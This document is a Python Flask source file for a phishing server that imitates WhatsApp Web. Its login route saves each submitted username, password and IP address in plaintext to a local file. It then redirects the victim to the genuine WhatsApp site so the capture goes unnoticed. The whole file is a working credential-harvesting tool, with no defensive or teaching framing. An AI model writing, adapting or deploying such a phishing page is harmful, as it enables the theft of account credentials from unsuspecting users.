from flask import Flask, request, redirect, render_template

app = Flask("whatapp")

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    with open('login.txt', 'a') as f:
        f.write(f"username:{username}, password:{password}, ip:{ip}\n")
    return redirect("https://web.whatsapp.com")

app.run(debug=True)